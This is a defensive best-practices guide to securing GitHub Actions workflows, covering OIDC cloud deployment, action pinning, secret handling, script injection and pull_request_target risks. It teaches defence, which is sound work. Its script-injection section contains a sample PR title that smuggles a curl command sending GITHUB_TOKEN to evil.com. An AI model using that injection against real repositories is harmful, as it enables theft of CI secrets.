# GitHub Actions Security Best Practices

## Table of Contents

- [OIDC for Cloud Deployments](#oidc-for-cloud-deployments)
- [Third-Party Action Pinning](#third-party-action-pinning)
- [Secrets Management Best Practices](#secrets-management-best-practices)
- [Preventing Script Injection in Expressions](#preventing-script-injection-in-expressions)
- [Pull Request Target Security (Pwn Requests)](#pull-request-target-security-pwn-requests)
- [Minimizing GITHUB_TOKEN Permissions](#minimizing-github_token-permissions)
- [CodeQL and Security Scanning Workflows](#codeql-and-security-scanning-workflows)
- [Dependency Review Action](#dependency-review-action)
- [Signed Commits and Attestations](#signed-commits-and-attestations)
- [Private Action Repositories and GHES Considerations](#private-action-repositories-and-ghes-considerations)

---

## OIDC for Cloud Deployments

OIDC (OpenID Connect) eliminates static cloud credentials. GitHub issues a short-lived JWT token, and your cloud provider validates it against claims (repo, branch, environment).

### AWS — Detailed Setup

**1. Create an OIDC identity provider in AWS IAM**:

```bash
# Using AWS CLI
aws iam create-open-id-connect-provider \
  --url "https://token.actions.githubusercontent.com" \
  --client-id-list "sts.amazonaws.com" \
  --thumbprint-list "1c58a3a8518e8759bf075b76b750d4f2df264fcd"
```

**2. Create an IAM role with trust policy**:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::ACCOUNT_ID:oidc-provider/token.actions.githubusercontent.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
        },
        "StringLike": {
          "token.actions.githubusercontent.com:sub": "repo:my-org/my-repo:*"
        }
      }
    }
  ]
}
```

**3. Restrict by branch/environment** (strongly recommended):

```json
{
  "Condition": {
    "StringEquals": {
      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
      "token.actions.githubusercontent.com:sub": "repo:my-org/my-repo:environment:production"
    }
  }
}
```

Valid `sub` claim patterns:
- `repo:OWNER/REPO:ref:refs/heads/main` — only from `main` branch
- `repo:OWNER/REPO:environment:production` — only from `production` environment
- `repo:OWNER/REPO:pull_request` — any PR (rarely desirable for deployment)
- `repo:OWNER/REPO:ref:refs/tags/v*` — any tag starting with `v`

**4. Workflow usage**:

```yaml
permissions:
  id-token: write   # Required for OIDC
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production  # Must match the OIDC sub claim
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/github-deploy
          aws-region: us-east-1
          role-session-name: github-actions-${{ github.run_id }}
          # Optional: restrict assumed role duration
          role-duration-seconds: 900  # 15 minutes

      - run: aws sts get-caller-identity  # Verify
      - run: aws s3 sync dist/ s3://my-bucket/
```

### GCP — Detailed Setup

**1. Create a Workload Identity Pool and Provider**:

```bash
# Create pool
gcloud iam workload-identity-pools create "github-pool" \
  --project="MY_PROJECT_ID" \
  --location="global" \
  --display-name="GitHub Actions Pool"

# Create provider
gcloud iam workload-identity-pools providers create-oidc "github-provider" \
  --project="MY_PROJECT_ID" \
  --location="global" \
  --workload-identity-pool="github-pool" \
  --display-name="GitHub Provider" \
  --attribute-mapping="google.subject=assertion.sub,attribute.actor=assertion.actor,attribute.repository=assertion.repository" \
  --issuer-uri="https://token.actions.githubusercontent.com" \
  --attribute-condition="assertion.repository_owner == 'my-org'"
```

**2. Grant service account impersonation**:

```bash
gcloud iam service-accounts add-iam-policy-binding \
  "deploy-sa@MY_PROJECT_ID.iam.gserviceaccount.com" \
  --project="MY_PROJECT_ID" \
  --role="roles/iam.workloadIdentityUser" \
  --member="principalSet://iam.googleapis.com/projects/PROJECT_NUMBER/locations/global/workloadIdentityPools/github-pool/attribute.repository/my-org/my-repo"
```

**3. Workflow usage**:

```yaml
permissions:
  id-token: write
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: google-github-actions/auth@v2
        with:
          workload_identity_provider: 'projects/PROJECT_NUMBER/locations/global/workloadIdentityPools/github-pool/providers/github-provider'
          service_account: 'deploy-sa@MY_PROJECT_ID.iam.gserviceaccount.com'

      - uses: google-github-actions/setup-gcloud@v2
      - run: gcloud run deploy myapp --image gcr.io/MY_PROJECT_ID/myapp:latest
```

### Azure — Detailed Setup

**1. Create an App Registration with federated credential**:

```bash
# Create app registration
az ad app create --display-name "github-actions-deploy"
APP_ID=$(az ad app list --display-name "github-actions-deploy" --query '[0].appId' -o tsv)

# Create service principal
az ad sp create --id $APP_ID

# Add federated credential
az ad app federated-credential create --id $APP_ID --parameters '{
  "name": "github-main-deploy",
  "issuer": "https://token.actions.githubusercontent.com",
  "subject": "repo:my-org/my-repo:environment:production",
  "audiences": ["api://AzureADTokenExchange"]
}'

# Grant RBAC to the service principal
az role assignment create \
  --assignee $APP_ID \
  --role "Contributor" \
  --scope "/subscriptions/SUBSCRIPTION_ID/resourceGroups/MY_RG"
```

**2. Workflow usage**:

```yaml
permissions:
  id-token: write
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - uses: azure/login@v2
        with:
          client-id: ${{ secrets.AZURE_CLIENT_ID }}
          tenant-id: ${{ secrets.AZURE_TENANT_ID }}
          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}

      - uses: azure/webapps-deploy@v3
        with:
          app-name: 'my-web-app'
          package: './dist'
```

Note: `client-id`, `tenant-id`, and `subscription-id` are not secrets — they can be stored as environment variables. Only the federated trust relationship provides authorization.

---

## Third-Party Action Pinning

### Why tags are dangerous

Tags are mutable Git references. A compromised maintainer (or stolen credentials) can move a tag to point at malicious code:

```yaml
# DANGEROUS: Mutable tag — could change at any time
- uses: popular/action@v3

# DANGEROUS: Branch reference
- uses: popular/action@main

# SAFE: Pinned to immutable commit SHA
- uses: popular/action@abc123def456789012345678901234567890abcd  # v3.2.1
```

### How to pin actions

```bash
# Find the SHA for a specific version
gh api repos/actions/checkout/git/ref/tags/v4.2.2 --jq '.object.sha'

# Or browse releases on GitHub to find the commit SHA
```

Format: `uses: owner/repo@FULL_40_CHAR_SHA  # vX.Y.Z`

Always add a version comment for readability. This makes it easy to see what version you're on and to update.

### Automated SHA updates with Dependabot

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
    commit-message:
      prefix: "ci"
    # Group minor/patch updates to reduce PR noise
    groups:
      actions:
        patterns:
          - "*"
        update-types:
          - "minor"
          - "patch"
```

Dependabot creates PRs to update pinned SHAs, showing you the diff and changelog.

### Renovate alternative

```json
{
  "$schema": "https://docs.renovatebot.com/renovate-schema.json",
  "extends": ["config:base"],
  "github-actions": {
    "enabled": true,
    "pinDigests": true
  }
}
```

### Supply chain risk assessment

Before using any third-party action:

1. **Check the source** — is it from a verified creator or well-known org?
2. **Review the action code** — especially `action.yml`, entrypoint, and any network calls.
3. **Check permissions** — does it request more permissions than needed?
4. **Prefer official/verified actions** — `actions/*`, `github/*`, `azure/*`, `aws-actions/*`, `google-github-actions/*`.
5. **Fork critical actions** — maintain your own fork for actions in your critical path.

```yaml
# Using a forked action (full control)
- uses: my-org/forked-deploy-action@a1b2c3d4e5f6  # forked from original/deploy-action v2.1.0
```

---

## Secrets Management Best Practices

### Organization vs repository vs environment secrets

| Level | Scope | Use Case |
|---|---|---|
| **Organization** | All (or selected) repos | Shared credentials (Docker registry, Slack webhook) |
| **Repository** | Single repo | Repo-specific API keys, deploy tokens |
| **Environment** | Single repo + specific environment | Production DB password, cloud credentials |

**Precedence**: Environment > Repository > Organization (if same name exists at multiple levels).

### Secret hygiene rules

**1. Never echo or log secrets**:

```yaml
# BAD: Secret visible in logs
- run: echo "Token is ${{ secrets.API_KEY }}"

# BAD: curl verbose mode exposes headers
- run: curl -v -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://api.example.com

# GOOD: Use environment variables (masked in logs if they match a secret value)
- run: curl -s -H "Authorization: Bearer $TOKEN" https://api.example.com
  env:
    TOKEN: ${{ secrets.API_KEY }}
```

**2. Mask custom values**:

```yaml
- run: |
    DERIVED_TOKEN=$(generate-token)
    echo "::add-mask::$DERIVED_TOKEN"
    echo "token=$DERIVED_TOKEN" >> "$GITHUB_OUTPUT"
```

**3. Limit `secrets: inherit`**:

```yaml
# BAD: Caller passes ALL secrets to reusable workflow
jobs:
  deploy:
    uses: ./.github/workflows/deploy.yml
    secrets: inherit  # Every secret is available — violates least privilege

# GOOD: Pass only needed secrets
jobs:
  deploy:
    uses: ./.github/workflows/deploy.yml
    secrets:
      DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
```

**4. Rotate secrets regularly** — especially after:
- Employee departure
- Security incident
- Secret exposure in logs

**5. Use short-lived credentials**:

```yaml
# Instead of a long-lived API key, use OIDC (see above)
# Or generate short-lived tokens:
- uses: actions/create-github-app-token@v1
  id: app-token
  with:
    app-id: ${{ vars.APP_ID }}
    private-key: ${{ secrets.APP_PRIVATE_KEY }}
    # Token expires in 1 hour
- uses: actions/checkout@v4
  with:
    token: ${{ steps.app-token.outputs.token }}
```

### Environment protection for secrets

```yaml
jobs:
  deploy:
    environment: production  # Secrets only available after approval
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh
        env:
          DB_PASSWORD: ${{ secrets.PROD_DB_PASSWORD }}
          # This secret is only accessible in the 'production' environment
```

---

## Preventing Script Injection in Expressions

### The vulnerability

GitHub Actions expressions (`${{ }}`) are string-interpolated before the shell sees them. User-controlled inputs can inject shell commands.

### Dangerous contexts (user-controlled)

These values come from external users and can contain arbitrary content:

- `github.event.issue.title`
- `github.event.issue.body`
- `github.event.pull_request.title`
- `github.event.pull_request.body`
- `github.event.comment.body`
- `github.event.review.body`
- `github.event.discussion.title`
- `github.event.discussion.body`
- `github.head_ref` (branch name)
- `github.event.pages.*.page_name`
- `github.event.commits.*.message`
- `github.event.commits.*.author.name`

### Vulnerable example

```yaml
# VULNERABLE: Attacker creates PR with title: "; curl http://evil.com/steal?t=$GITHUB_TOKEN #
- name: Greet PR author
  run: echo "Thanks for PR: ${{ github.event.pull_request.title }}"
  # After interpolation:
  # echo "Thanks for PR: "; curl http://evil.com/steal?t=$GITHUB_TOKEN #"
```

### Fix: Use environment variables

```yaml
# SAFE: Title is passed as an environment variable, not interpolated into the script
- name: Greet PR author
  run: echo "Thanks for PR: $TITLE"
  env:
    TITLE: ${{ github.event.pull_request.title }}
```

The shell treats `$TITLE` as a string value, not as code to execute.

### Fix: Use `actions/github-script` for complex logic

```yaml
- uses: actions/github-script@v7
  with:
    script: |
      // context.payload values are safely handled as JavaScript strings
      const title = context.payload.pull_request.title;
      await github.rest.issues.createComment({
        ...context.repo,
        issue_number: context.issue.number,
        body: `Review started for: ${title}`
      });
```

### Fix: Validate and sanitize inputs

```yaml
- name: Validate branch name
  run: |
    if [[ ! "$BRANCH" =~ ^[a-zA-Z0-9/_.-]+$ ]]; then
      echo "::error::Invalid branch name"
      exit 1
    fi
  env:
    BRANCH: ${{ github.head_ref }}
```

### `if` expressions are also injectable

```yaml
# VULNERABLE: Expression injection in if condition
- if: contains(github.event.comment.body, '/deploy')
  # If comment body is crafted to manipulate the expression evaluation, this is exploitable.
  # In practice, 'if' expressions are safer because they're evaluated by GitHub's expression
  # engine, not a shell. But the injected value could still affect truthiness.

# SAFER: Use exact matching
- if: github.event.comment.body == '/deploy'
```

---

## Pull Request Target Security (Pwn Requests)

### The danger of `pull_request_target`

`pull_request_target` runs in the context of the **base branch** (e.g., `main`), with full access to secrets and write permissions. If you check out and execute code from the **PR head**, an attacker can modify that code to steal secrets.

### Vulnerable pattern (never do this)

```yaml
# CRITICALLY VULNERABLE
on:
  pull_request_target:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # Checks out ATTACKER's code
      - run: npm install  # Executes attacker-controlled postinstall scripts
        env:
          SECRET: ${{ secrets.DEPLOY_KEY }}  # Attacker can exfiltrate this
```

### Safe patterns for `pull_request_target`

**Pattern 1: Never check out PR code** — only use for metadata operations:

```yaml
on:
  pull_request_target:
    types: [opened, labeled]

permissions:
  pull-requests: write

jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      # DO NOT checkout PR head code
      - uses: actions/github-script@v7
        with:
          script: |
            // Only access PR metadata, never execute PR code
            const { data: files } = await github.rest.pulls.listFiles({
              ...context.repo,
              pull_number: context.payload.pull_request.number
            });
            const labels = [];
            if (files.some(f => f.filename.startsWith('docs/'))) labels.push('documentation');
            if (files.some(f => f.filename.startsWith('src/'))) labels.push('code-change');
            if (labels.length) {
              await github.rest.issues.addLabels({
                ...context.repo,
                issue_number: context.payload.pull_request.number,
                labels
              });
            }
```

**Pattern 2: Two-workflow approach** — untrusted build, then trusted reporting:

```yaml
# ci.yml — runs on PR (no secrets, no write access)
on: [pull_request]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4  # Safe: checks out PR code in unprivileged context
      - run: npm test
      - run: echo "${{ github.event.pull_request.number }}" > pr-number.txt
      - uses: actions/upload-artifact@v4
        with:
          name: results
          path: |
            test-results.xml
            pr-number.txt

# report.yml — triggered by ci.yml completion (has secrets)
on:
  workflow_run:
    workflows: ["CI"]
    types: [completed]
permissions:
  pull-requests: write
jobs:
  report:
    if: github.event.workflow_run.event == 'pull_request'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: results
          run-id: ${{ github.event.workflow_run.id }}
          github-token: ${{ secrets.GITHUB_TOKEN }}
      # Process artifacts (data only, no code execution from the PR)
```

**Pattern 3: Checkout PR code in isolated read-only step** (if you must analyze PR code):

```yaml
on:
  pull_request_target:

jobs:
  analyze:
    runs-on: ubuntu-latest
    steps:
      # Step 1: Checkout base branch (trusted)
      - uses: actions/checkout@v4
        with:
          path: base

      # Step 2: Checkout PR code into separate directory
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
          path: pr-code

      # Step 3: Only run TRUSTED tools against PR code — never execute PR code
      - run: |
          # SAFE: Running our trusted diff tool against untrusted code
          diff -r base/src pr-code/src > changes.txt || true
          # UNSAFE would be: cd pr-code && npm install (executes attacker code)
```

---

## Minimizing GITHUB_TOKEN Permissions

### Default permissions problem

By default, `GITHUB_TOKEN` may have broad permissions (depending on org/repo settings). Always explicitly declare the minimum required.

### Setting restrictive defaults

**Org-level** (recommended): **Settings → Actions → General → Workflow permissions** → select "Read repository contents and packages permissions".

**Repo-level**: Same setting path.

**Workflow-level** (always do this):

```yaml
permissions:
  contents: read

jobs:
  lint:
    # Inherits workflow-level permissions (contents: read only)
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm run lint

  deploy:
    permissions:
      contents: read
      deployments: write
      id-token: write
    runs-on: ubuntu-latest
    environment: production
    steps:
      - uses: actions/checkout@v4
      - run: ./deploy.sh
```

### Permission reference

Set only what each job needs:

```yaml
permissions:
  actions: read|write        # Manage Actions (cache, artifacts, workflow runs)
  checks: read|write         # Create/update check runs and check suites
  contents: read|write       # Repo contents, commits, branches, releases, tags
  deployments: read|write    # Deployment statuses
  id-token: write            # Request OIDC JWT tokens
  issues: read|write         # Issues and comments
  packages: read|write       # GitHub Packages
  pages: read|write          # GitHub Pages
  pull-requests: read|write  # PRs and PR comments
  repository-projects: read|write  # Project boards
  security-events: read|write     # Code scanning alerts
  statuses: read|write       # Commit statuses
```

### Empty permissions (most restrictive)

```yaml
permissions: {}  # No permissions at all — not even contents:read
# The job cannot even checkout the repo without explicit permissions
```

### Per-step permission awareness

Remember that all steps within a job share the same `GITHUB_TOKEN` permissions. If one step needs elevated access, the entire job has it. To minimize risk, split into separate jobs:

```yaml
jobs:
  # Job 1: Only reads code
  build:
    permissions: { contents: read }
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm run build
      - uses: actions/upload-artifact@v4
        with:
          name: dist
          path: dist/

  # Job 2: Only writes deployments (no code access needed)
  deploy:
    needs: build
    permissions: { deployments: write, id-token: write }
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: dist
      - run: ./deploy.sh
```

---

## CodeQL and Security Scanning Workflows

### Basic CodeQL setup

```yaml
name: CodeQL Analysis
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
  schedule:
    - cron: '0 6 * * 1'  # Weekly full scan

permissions:
  security-events: write
  contents: read

jobs:
  analyze:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        language: ['javascript', 'python']
        # Supported: javascript, python, go, java, csharp, cpp, ruby, swift, kotlin
    steps:
      - uses: actions/checkout@v4

      - uses: github/codeql-action/init@v3
        with:
          languages: ${{ matrix.language }}
          # Use extended query suites for more thorough analysis
          queries: +security-extended,security-and-quality

      # For compiled languages, CodeQL needs to observe the build:
      # - uses: github/codeql-action/autobuild@v3
      # Or specify custom build commands:
      # - run: make build

      - uses: github/codeql-action/analyze@v3
        with:
          category: "/language:${{ matrix.language }}"
```

### Custom CodeQL queries

```yaml
- uses: github/codeql-action/init@v3
  with:
    languages: javascript
    queries: |
      +security-extended
      my-org/codeql-queries/javascript/custom-rules@main
    config: |
      paths-ignore:
        - '**/test/**'
        - '**/vendor/**'
      query-filters:
        - exclude:
            id: js/unused-local-variable
```

### Third-party security scanners

```yaml
name: Security Scan
on:
  push:
    branches: [main]
  pull_request:

permissions:
  security-events: write
  contents: read

jobs:
  trivy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: aquasecurity/trivy-action@master
        with:
          scan-type: 'fs'
          scan-ref: '.'
          format: 'sarif'
          output: 'trivy-results.sarif'
          severity: 'CRITICAL,HIGH'
      - uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: 'trivy-results.sarif'

  container-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: docker build -t myapp:scan .
      - uses: aquasecurity/trivy-action@master
        with:
          image-ref: 'myapp:scan'
          format: 'sarif'
          output: 'container-results.sarif'
      - uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: 'container-results.sarif'
          category: 'container-scan'
```

### Secret scanning with push protection

Secret scanning is enabled at the repo/org level — not via workflow YAML. But you can add custom patterns:

```yaml
# Validate no secrets in code (defense in depth)
name: Secret Check
on: [pull_request]
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: trufflesecurity/trufflehog@main
        with:
          extra_args: --only-verified --json
```

---

## Dependency Review Action

The dependency review action prevents PRs from introducing vulnerable or license-non-compliant dependencies.

### Basic setup

```yaml
name: Dependency Review
on: [pull_request]

permissions:
  contents: read
  pull-requests: write

jobs:
  dependency-review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/dependency-review-action@v4
        with:
          fail-on-severity: moderate
          # Deny specific licenses
          deny-licenses: GPL-3.0, AGPL-3.0
          # Or allow only specific licenses
          # allow-licenses: MIT, Apache-2.0, BSD-2-Clause, BSD-3-Clause, ISC
          comment-summary-in-pr: always
```

### Advanced configuration

```yaml
- uses: actions/dependency-review-action@v4
  with:
    fail-on-severity: high
    deny-licenses: GPL-3.0, AGPL-3.0, SSPL-1.0
    # Exempt specific advisories (after manual review)
    allow-ghsas: GHSA-xxxx-yyyy-zzzz
    # Only scan specific ecosystems
    # allow-dependencies-licenses: pkg:npm/@my-org/*
    # Fail on specific CVSS score
    fail-on-scopes: runtime  # Only fail on runtime deps, not devDependencies
    comment-summary-in-pr: on-failure
    warn-only: false
    base-ref: ${{ github.event.pull_request.base.sha }}
    head-ref: ${{ github.event.pull_request.head.sha }}
```

### Combining with Dependabot

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
    # Group all patch updates
    groups:
      patch-updates:
        update-types: ["patch"]
    # Auto-approve patch updates
    reviewers:
      - "my-org/frontend-team"
```

```yaml
# Auto-merge Dependabot PRs for patch updates
name: Auto-merge Dependabot
on: pull_request

permissions:
  contents: write
  pull-requests: write

jobs:
  auto-merge:
    if: github.actor == 'dependabot[bot]'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/dependency-review-action@v4
        with:
          fail-on-severity: low
      - run: gh pr merge --auto --squash "$PR_URL"
        env:
          PR_URL: ${{ github.event.pull_request.html_url }}
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

---

## Signed Commits and Attestations

### Artifact attestations (GitHub native)

GitHub's artifact attestation creates a verifiable SLSA provenance record for your build artifacts:

```yaml
name: Build and Attest
on:
  push:
    tags: ['v*']

permissions:
  contents: read
  id-token: write      # For signing
  attestations: write  # For creating attestations

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm run build

      - uses: actions/attest-build-provenance@v2
        with:
          subject-path: 'dist/**'

      - uses: actions/upload-artifact@v4
        with:
          name: dist
          path: dist/
```

### Container image attestation

```yaml
jobs:
  build-image:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write
      id-token: write
      attestations: write
    steps:
      - uses: actions/checkout@v4

      - uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - id: push
        uses: docker/build-push-action@v6
        with:
          context: .
          push: true
          tags: ghcr.io/${{ github.repository }}:${{ github.sha }}

      - uses: actions/attest-build-provenance@v2
        with:
          subject-name: ghcr.io/${{ github.repository }}
          subject-digest: ${{ steps.push.outputs.digest }}
          push-to-registry: true
```

### Verifying attestations

```bash
# Verify artifact attestation
gh attestation verify dist/app.js --repo OWNER/REPO

# Verify container image
gh attestation verify oci://ghcr.io/OWNER/REPO:latest --repo OWNER/REPO
```

### Signed commits in workflows

When a workflow pushes commits, sign them with a GitHub App or GPG key:

```yaml
jobs:
  update:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - uses: actions/create-github-app-token@v1
        id: app-token
        with:
          app-id: ${{ vars.BOT_APP_ID }}
          private-key: ${{ secrets.BOT_APP_PRIVATE_KEY }}

      - uses: actions/checkout@v4
        with:
          token: ${{ steps.app-token.outputs.token }}

      - name: Configure git for signed commits
        run: |
          git config user.name "my-bot[bot]"
          git config user.email "12345+my-bot[bot]@users.noreply.github.com"
          # GitHub automatically signs commits made by GitHub Apps

      - run: |
          # Make changes
          date > last-updated.txt
          git add .
          git commit -m "chore: automated update"
          git push
```

---

## Private Action Repositories and GHES Considerations

### Using actions from private repositories

By default, actions in private repos are only accessible to workflows in the same repo.

**Share within an organization**:
1. Go to the private action repo → **Settings → Actions → General**.
2. Under "Access", select "Accessible from repositories in the organization" (or specific repos).

**Use in workflows**:

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      # For private actions in the same org — works if access is granted
      - uses: my-org/private-action@v1

      # For private actions requiring authentication
      - uses: actions/checkout@v4
        with:
          repository: my-org/private-action
          ref: v1
          token: ${{ secrets.ORG_PAT }}
          path: .github/actions/private-action
      - uses: ./.github/actions/private-action
```

### GitHub App token for cross-repo action access

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/create-github-app-token@v1
        id: app-token
        with:
          app-id: ${{ vars.APP_ID }}
          private-key: ${{ secrets.APP_PRIVATE_KEY }}
          repositories: "private-action-repo"

      - uses: actions/checkout@v4
        with:
          repository: my-org/private-action-repo
          token: ${{ steps.app-token.outputs.token }}
          path: .github/actions/my-action

      - uses: ./.github/actions/my-action
```

### Internal repositories (GitHub Enterprise)

Enterprise organizations can create "internal" repositories — visible to all org members but not public. Actions in internal repos are accessible to other repos in the same org by default.

### GitHub Enterprise Server (GHES) considerations

**1. Action availability** — GHES instances don't have automatic access to github.com actions. Options:

```yaml
# Option A: GitHub Connect (connects GHES to github.com)
# Enabled by GHES admin. Actions are proxied from github.com.
- uses: actions/checkout@v4  # Resolved via GitHub Connect

# Option B: Manual sync with actions-sync tool
# https://github.com/actions/actions-sync
# Syncs specific actions to your GHES instance

# Option C: Use local actions from your GHES instance
- uses: my-ghes-org/checkout-action@v1
```

**2. Runner groups** — GHES supports enterprise-level runner groups:

```yaml
# Restrict runners by organization
runs-on:
  group: production-runners
  labels: [linux, x64]
```

**3. Rate limits on GHES** — configurable by the GHES admin. Default limits are higher than github.com but depend on instance size.

**4. OIDC on GHES** — supported since GHES 3.5. The issuer URL is `https://HOSTNAME/_services/token`:

```json
{
  "Condition": {
    "StringEquals": {
      "HOSTNAME/_services/token:sub": "repo:ORG/REPO:ref:refs/heads/main"
    }
  }
}
```

**5. Allowed actions** — GHES admins can restrict which actions are allowed:

- All actions (not recommended for enterprise)
- Only local actions
- Selected actions (allow list by org/repo pattern)

```
# Example allow list patterns:
actions/*            # All official actions
my-org/*             # All org actions
hashicorp/setup-terraform@*  # Specific third-party action
```

**6. Caching and artifacts** — GHES uses external blob storage (Azure Blob, S3, or MinIO). Ensure the storage backend is properly sized for your usage.
